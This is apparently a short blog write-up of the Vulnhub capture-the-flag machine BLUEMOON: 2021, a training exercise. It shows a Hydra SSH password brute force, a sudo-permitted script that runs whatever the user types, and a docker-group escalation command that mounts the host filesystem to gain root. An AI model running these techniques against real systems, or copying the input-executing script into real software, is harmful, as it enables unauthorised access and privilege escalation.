## BLUEMOON: 2021
This is [BLUEMOON: 2021](https://www.vulnhub.com/entry/bluemoon-2021,679/) from Vulnhub. It is easy rated and I picked it to do because someone on the Vulnhub discord was looking for a write-up, which made me think maybe it was challenging. After that - and before I got a chance to do it myself - someone else posted a writeup, but I didn't read it. Nevertheless, this is going to be super short, because it was pretty simple. Let's go.

## Ports
FTP, SSH and HTTP. No anon on the FTP.

## Web
It needs some heavy enumeration to find what we want:

Once we have it, we get a link to a QR code which contains FTP credentials.

## FTP
When we login to FTP we get this:

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/bluemoon]
└─# ftp 192.168.1.203                                                                                                                                      130 ⨯

-rw-r--r--    1 0        0             363 Mar 08 00:28 p_lists.txt
{% endhighlight %}

And that contains a username (in the 'information.txt') and a list of passwords. Hydra makes short work of it.

{% highlight shell %}

└─# hydra -l robin -P ./p_lists.txt ssh://192.168.1.203
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

{% endhighlight %}

And we can SSH in. 

## Robin
Robin can do this:

{% highlight shell %}
robin@BlueMoon:~/project$ sudo -l
Matching Defaults entries for robin on bluemoon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on bluemoon:
    (jerry) NOPASSWD: /home/robin/project/feedback.sh
{% endhighlight %}

Which is:

{% highlight shell %}
robin@BlueMoon:~/project$ cat feedback.sh 
#!/bin/bash

clear
echo -e "Script For FeedBack\n"

read -p "Enter Your Name : " name
echo ""
read -p "Enter You FeedBack About This Target Machine : " feedback
echo ""
$feedback 2>/dev/null

echo -e "\nThanks For Your FeedBack...!\n"
{% endhighlight %}

In case it's not obvious, whatever is entered on the second read will be executed. I use *sh* to get a shell as Jerry and then upgrade it with python.

## Jerry > root
Jerry is in the docker group:

{% highlight shell %}
id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
docker run -it -v /:/mnt alpine chroot /mnt
root@a93f401a9aa9:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

{% endhighlight %}

So that was that, see ya.
